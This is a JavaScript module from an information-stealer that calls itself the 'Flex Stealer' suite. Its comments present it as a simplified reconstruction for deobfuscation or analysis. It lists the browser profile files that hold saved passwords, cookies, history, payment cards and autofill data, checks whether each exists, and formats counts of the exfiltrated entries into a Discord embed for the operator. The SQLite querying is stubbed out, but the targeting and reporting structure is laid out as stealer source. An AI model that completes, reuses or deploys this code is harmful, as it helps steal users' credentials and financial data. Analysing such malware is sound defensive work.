const fs = require('fs');
const path = require('path');

/**
 * Browser Statistics Module.
 * Scans browser profiles to count exfiltrated data entries.
 * Part of the Flex Stealer | 2026 suite.
 */

const scanBrowserStats = (profilePath) => {
    const stats = {
        passwords: 0,
        cookies: 0,
        history: 0,
        cards: 0,
        autofill: 0
    };

    // This is a simplified representation of the entry counting logic.
    // In the real malware, it would open the SQLite databases.
    // Here we provide the structure for the analysis output.

    const targets = [
        { file: 'Login Data', key: 'passwords' },
        { file: 'Cookies', key: 'cookies' },
        { file: 'History', key: 'history' },
        { file: 'Web Data', key: 'cards' },
        { file: 'Web Data', key: 'autofill' }
    ];

    targets.forEach(target => {
        const fullPath = path.join(profilePath, target.file);
        if (fs.existsSync(fullPath)) {
            // In a real scenario, this would query the SQLite DB and return row count.
            // For the purpose of deobfuscation, we maintain the capability structure.
        }
    });

    return stats;
};

/**
 * Formats the gathered statistics into a readable Discord embed description.
 */
const formatStatsSummary = (allStats) => {
    let summary = [];
    let totalItems = 0;

    for (const [browserName, stats] of Object.entries(allStats)) {
        let browserLines = [];
        if (stats.passwords > 0) browserLines.push(`🔑 Passwords: ${stats.passwords}`);
        if (stats.cookies > 0) browserLines.push(`🍪 Cookies: ${stats.cookies}`);
        if (stats.history > 0) browserLines.push(`⏳ History: ${stats.history}`);
        if (stats.cards > 0) browserLines.push(`💳 Cards: ${stats.cards}`);
        if (stats.autofill > 0) browserLines.push(`📝 Autofill: ${stats.autofill}`);

        if (browserLines.length > 0) {
            summary.push(`**${browserName}**\n${browserLines.join('\n')}`);
            totalItems += Object.values(stats).reduce((a, b) => a + b, 0);
        }
    }

    return {
        content: summary.join('\n\n') || "No browser data found.",
        total: totalItems,
        color: 0xffffff,
        timestamp: new Date().toISOString()
    };
};

module.exports = {
    scanBrowserStats,
    formatStatsSummary
};